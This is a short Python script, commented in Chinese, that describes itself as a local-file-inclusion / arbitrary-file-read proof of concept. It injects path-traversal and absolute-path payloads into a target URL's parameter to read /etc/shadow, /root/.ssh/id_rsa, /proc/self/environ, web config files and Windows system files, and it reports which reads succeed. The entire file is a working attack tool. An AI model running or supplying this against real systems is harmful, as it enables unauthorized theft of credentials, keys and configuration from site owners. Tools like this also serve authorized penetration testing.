#!/usr/bin/env python3
"""
LFI/任意文件读取 POC 库
"""
import argparse, sys, urllib.parse
sys.path.insert(0, '..')
from utils.http import detect_lfi, http_get

COMMON_PATHS = {
    "linux": [
        "/etc/passwd",
        "/etc/hosts",
        "/etc/shadow",
        "/var/log/auth.log",
        "/var/log/apache2/access.log",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/root/.ssh/id_rsa",
        "/etc/my.cnf",
        "/var/www/html/config.php",
    ],
    "windows": [
        "C:\\Windows\\win.ini",
        "C:\\boot.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\xampp\\apache\\conf\\httpd.conf",
        "C:\\ProgramData\\MySQL\\my.ini",
    ],
    "Traversal": [
        "../../../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "..\\..\\..\\..\\Windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
}

def main():
    parser = argparse.ArgumentParser(description="LFI/任意文件读取检测")
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("-p", "--param", default="file", help="参数名")
    args = parser.parse_args()

    print(f"[*] 目标: {args.target}")
    base = args.target.split('?')[0]
    found = []

    for category, paths in COMMON_PATHS.items():
        print(f"\n[*] {category}:")
        for path in paths[:5]:
            target = f"{base}?{args.param}={urllib.parse.quote(path)}"
            resp = http_get(target, timeout=10)
            body = resp.get("body", b"").decode('utf-8', errors='ignore')
            status = resp.get("status", 0)
            if "root:" in body and "/bin/" in body:
                print(f"    [+] 成功读取: {path}")
                found.append(path)
            elif "root:" in body:
                print(f"    [+] 成功: {path}")
                found.append(path)
            elif "[boot loader]" in body or ":]" in body:
                print(f"    [+] 成功读取: {path}")
                found.append(path)
            else:
                print(f"    [-] {path}")

    if found:
        print(f"\n[+] 共成功读取 {len(found)} 个文件")
    else:
        print("\n[-] 未读取到任何文件")

if __name__ == "__main__":
    main()
